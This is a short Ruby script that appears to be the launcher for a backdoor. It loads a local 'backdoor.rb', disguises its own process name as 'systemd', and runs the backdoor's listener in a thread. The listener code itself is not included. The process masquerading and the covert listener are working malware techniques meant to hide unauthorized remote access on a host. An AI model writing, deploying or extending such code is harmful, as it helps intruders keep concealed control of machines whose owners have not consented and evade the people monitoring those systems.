#! /usr/bin/env ruby

#-------------------------------------------------------------------------------
# Requires
#-------------------------------------------------------------------------------
require 'thread'

# Local files
curdir = File.dirname(__FILE__);
require curdir + '/backdoor.rb'

#-------------------------------------------------------------------------------
# Preparations
#-------------------------------------------------------------------------------

def set_process_mask(mask)
    $0 = mask
end

begin
    set_process_mask("systemd")
    
    backdoor = Backdoor.new
    backdoor_thread = Thread.new { backdoor.listen }
    backdoor_thread.join
    
    rescue Interrupt
    
    Thread.kill(backdoor_thread)
    
    exit 0
end
